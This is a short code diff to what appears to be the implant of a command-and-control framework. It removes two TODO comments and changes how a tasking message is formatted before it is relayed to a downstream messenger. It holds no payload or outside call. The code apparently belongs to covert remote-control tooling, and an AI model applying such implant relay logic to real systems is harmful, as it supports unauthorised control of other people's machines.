@@ -305,7 +305,6 @@ namespace GruntExecutor
 
         public GruntTaskingMessage ReadTaskingMessage()
         {
-            // TODO: why does this need to be PostResponse?
             string read = "";
             lock (_UpstreamLock)
             {
@@ -332,8 +331,7 @@ namespace GruntExecutor
                 IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                 if (relay != null)
                 {
-                    // TODO: why does this need to be PostResponse?
-                    relay.Write(this.Profile.FormatWriteFormat(wrappedMessage));
+                    relay.Write(this.Profile.FormatReadFormat(wrappedMessage));
                 }
                 return null;
             }
